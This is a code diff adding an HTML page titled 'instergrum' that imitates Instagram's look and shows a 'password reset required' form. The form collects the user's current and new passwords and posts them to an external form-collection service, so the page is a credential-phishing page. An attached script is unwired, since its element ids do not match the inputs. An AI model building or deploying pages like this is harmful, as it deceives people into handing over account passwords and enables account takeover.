@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>instergrum</title>
+
+<style>
+  /* Instagram-style gradient background */
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: linear-gradient(135deg, #f58529, #dd2a7b, #8134af, #515bd4);
+  }
+
+  /* Centered white card */
+  .card {
+    background: #fff;
+    padding: 30px;
+    border-radius: 15px;
+    width: 90%;
+    max-width: 400px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    text-align: center;
+  }
+
+  h2 {
+    margin-bottom: 20px;
+    color: #333;
+  }
+
+  /* Inputs styling */
+  input[type="password"] {
+    width: 100%;
+    padding: 12px 15px;
+    margin: 10px 0;
+    border-radius: 10px;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+    font-size: 16px;
+  }
+
+  /* Purple Change button */
+  button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 15px;
+    border: none;
+    border-radius: 10px;
+    background: #833ab4;
+    background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045);
+    color: #fff;
+    font-size: 16px;
+    cursor: pointer;
+    transition: 0.3s;
+  }
+
+  button:hover {
+    opacity: 0.9;
+  }
+
+  /* Responsive adjustments */
+  @media (max-width: 500px) {
+    .card {
+      padding: 20px;
+    }
+    input[type="password"], button {
+      font-size: 14px;
+      padding: 10px;
+    }
+  }
+</style>
+</head>
+
+<body>
+<div class="card">
+<section class="contact">
+<form action="https://formcarry.com/s/MsH-Bw9oo9m" method="POST">
+  <h1 style="text-align: center;font-size: xx-large;">
+    <b>password resert required</h1>
+
+  <input
+    type="password"
+    name="current_password"
+    placeholder="Current password"
+    required
+  >
+
+  <input
+    type="password"
+    name="new_password"
+    placeholder="New password"
+    required
+  >
+
+  <input
+    type="password"
+    name="repeat_password"
+    placeholder="Rewrite new password"
+    required
+  >
+
+  <button type="submit">
+    Change
+  </button>
+</form>
+ </div>
+
+</section>
+
+<script>
+function sendMessage(event){
+  event.preventDefault();
+
+  let current = document.getElementById("current").value;
+  let newpass = document.getElementById("newpass").value;
+  let repeat = document.getElementById("repeat").value;
+
+  if(newpass !== repeat){
+    alert("❌ Passwords do not match");
+    return;
+  }
+
+  if(newpass.length < 6){
+    alert("❌ Password must be at least 6 characters");
+    return;
+  }
+
+  alert("✅ Password change request sent successfully!");
+  
+  // hapa ndio ungeunganisha backend (server)
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
